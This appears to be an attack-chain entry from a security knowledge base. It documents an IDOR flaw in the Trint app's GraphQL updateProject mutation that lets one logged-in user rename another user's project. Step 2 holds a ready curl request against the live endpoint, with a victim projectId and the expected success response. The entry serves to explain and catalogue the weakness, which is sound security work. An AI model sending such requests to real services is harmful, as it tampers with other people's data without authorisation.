---
id: ac-idor-trint-graphql-update
tags:
  - idor
  - graphql
  - web
  - authorization-bypass
  - data-tampering
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T12:00:00Z'
procedures:
  - '[[procedures/Exploit-IDOR-in-GraphQL-updateProject-Mutation]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:25:29.871Z'
description: >-
  Authenticated users exploit an Insecure Direct Object Reference (IDOR) in the
  Trint GraphQL API to unauthorizedly modify other users' project names, leading
  to data tampering and potential confusion.
skill_level: intermediate
impact_level: medium
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# IDOR in GraphQL updateProject Mutation to Tamper with Other Users' Projects

Multi-stage attack chain demonstrating exploitation of an IDOR vulnerability in the Trint application's GraphQL API, allowing authenticated users to update projects owned by other users.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | Medium |

## Attack Flow Visualization

```mermaid
graph LR
    A[Login as Target User and Observe Project] --> B[Login as Attacker and Send Malicious Mutation]
    B --> C[Verify Unauthorized Modification]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Browser or HTTP client (e.g., curl, Postman)
- Valid accounts for two users (target and attacker)

### Target Environment

- Web application: app.trint.com
- GraphQL endpoint: https://graphql2.trint.com/
- Authentication: JWT via Auth0

### Initial Access Requirements

- Authenticated access as two separate users
- Knowledge of target user's projectId (obtainable via observation or enumeration)
- Network access to the application

## Detailed Attack Procedures

### Step 1: Observe Target User's Project
procedure: [[procedures/Exploit-IDOR-in-GraphQL-updateProject-Mutation]]

**Objective**: Log in as the target user (User A) to identify and note the projectId of a project to be tampered with.

**Instructions**: Access the Trint application dashboard at https://app.trint.com/trints using User A's credentials. Navigate to the projects or folders section and observe a specific project, noting its ID (e.g., 'i2lu5qZVTwWnQQhPp_g8Ig') and current name.

**Expected Output**: Project details visible, including ID and name, as captured in a screenshot or log.

**Success Indicators**:
- Successful login as User A
- Project ID and name recorded

### Step 2: Exploit IDOR with Malicious Update
procedure: [[procedures/Exploit-IDOR-in-GraphQL-updateProject-Mutation]]

**Objective**: Log in as the attacker (User B) and send a GraphQL mutation to update User A's project using the observed projectId.

**Instructions**: First, authenticate as User B to obtain a JWT token. Then, execute the GraphQL updateProject mutation using [[commands/graphql-update-project-mutation]] to send a POST request to https://graphql2.trint.com/ with User A's projectId and a new project name.

```bash
curl -X POST https://graphql2.trint.com/ \
  -H "Authorization: Bearer [User B JWT Token]" \
  -H "Content-Type: application/json" \
  -d '{"operationName":"updateProject","variables":{"userId":"5ce502a21e1caf750d6c7f59","projectName":"abctesthorizontal","projectId":"i2lu5qZVTwWnQQhPp_g8Ig"},"query":"mutation updateProject($userId: String!, $projectName: String!, $projectId: String!) { updateProject(userId: $userId, projectName: $projectName, projectId: $projectId) { ...RenameProjectFragment __typename } } fragment RenameProjectFragment on Project { _id projectName updated __typename }"}'
```

**Expected Output**: GraphQL response with successful update, e.g., {"data":{"updateProject":{"projectName":"abctesthorizontal"}}}.

**Success Indicators**:
- HTTP 200 response with updated project data
- No authorization error

### Step 3: Verify the Tampering
procedure: [[procedures/Exploit-IDOR-in-GraphQL-updateProject-Mutation]]

**Objective**: Confirm the unauthorized change by re-accessing User A's account.

**Instructions**: Log back in as User A or refresh the dashboard at https://app.trint.com/trints. Check the targeted project to see if the name has been changed to the injected value (e.g., 'abctesthorizontal').

**Expected Output**: Project name updated as specified, visible in the UI or via API query.

**Success Indicators**:
- Project name modified without User A's consent
- Potential for confusion or integrity issues observed

## Attack Chain Summary

### Key Achievements

1. Identified target project via legitimate access
2. Bypassed ownership checks in GraphQL API to update another user's project
3. Demonstrated data tampering impact without further escalation

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Impact]]

---

*Last updated: 2023-10-01T12:00:00Z*
